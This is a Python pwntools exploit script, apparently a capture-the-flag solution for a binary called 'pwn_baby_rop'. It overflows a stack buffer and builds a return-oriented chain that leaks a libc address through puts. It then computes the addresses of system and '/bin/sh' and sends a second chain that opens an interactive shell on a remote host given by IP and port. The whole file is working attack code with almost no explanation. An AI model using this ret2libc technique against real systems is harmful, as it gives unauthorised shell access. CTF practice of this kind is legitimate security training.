#!/usr/bin/python3

from pwn import *

context.binary = './pwn_baby_rop'
elf = ELF('./pwn_baby_rop')

IP = '35.234.100.160'
port = 30741
offset = 256 + 8
padding = b'A'*offset

bss = 0x404040
vuln = 0x40117a
pop_rdi = pack(0x401663)
pop_rsi_r15 = pack(0x401661)
ret = pack(0x40101a)

# it looks like it is copying our payload to bss so we could include a second payload instread of padding

def leak_payload():
    payload = [padding, pop_rdi, pack(elf.got['puts']), pack(elf.plt['puts']), pack(vuln)]
    payload = b''.join(payload)
    return payload
def main():
    payload_leak_libc = leak_payload()

    p = remote(IP, port)
    #p = elf.process()
    #gdb.attach(p)

    p.recvline()
    p.sendline(payload_leak_libc)
    leak = u64(p.recv()[:6].ljust(8,b"\x00"))

    print(f'Address leaked: {hex(leak)}')
    libc_base = leak - 0x0875a0
    print(f'Address of LIBC BASE: {hex(libc_base)}')
    system = libc_base + 0x055410
    bin_sh = libc_base + 0x1b75aa

    print(f'Address of system is: {hex(system)}')
    print(f'Address of /bin/sh is: {hex(bin_sh)}')

    payload = [padding, pop_rdi, pack(bin_sh), ret, pack(system)] # add a ret for allignment purposes
    payload = b''.join(payload)
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()